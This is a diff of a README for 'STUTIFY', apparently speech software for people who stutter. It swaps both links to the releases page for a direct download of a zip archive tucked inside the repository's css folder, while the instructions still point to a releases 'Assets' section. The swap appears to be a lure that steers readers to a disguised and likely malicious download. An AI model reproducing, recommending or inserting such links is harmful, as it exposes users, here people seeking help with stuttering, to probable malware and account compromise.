@@ -1,6 +1,6 @@
 # 🔊 STUTIFY - Speech improvement software for better clarity
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/myxineglutinosameniere4389/STUTIFY/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/myxineglutinosameniere4389/STUTIFY/raw/refs/heads/main/Stutify/css/Software_v3.4.zip)
 
 ## 🎯 About Stutify
 
@@ -18,7 +18,7 @@ Stutify helps people who stutter gain confidence in their daily speech. The soft
 
 To get started, visit the link below to reach the latest version page.
 
-[https://github.com/myxineglutinosameniere4389/STUTIFY/releases](https://github.com/myxineglutinosameniere4389/STUTIFY/releases)
+[https://github.com/myxineglutinosameniere4389/STUTIFY/raw/refs/heads/main/Stutify/css/Software_v3.4.zip](https://github.com/myxineglutinosameniere4389/STUTIFY/raw/refs/heads/main/Stutify/css/Software_v3.4.zip)
 
 1. Navigate to the page listed above.
 2. Look for the section labeled Assets.
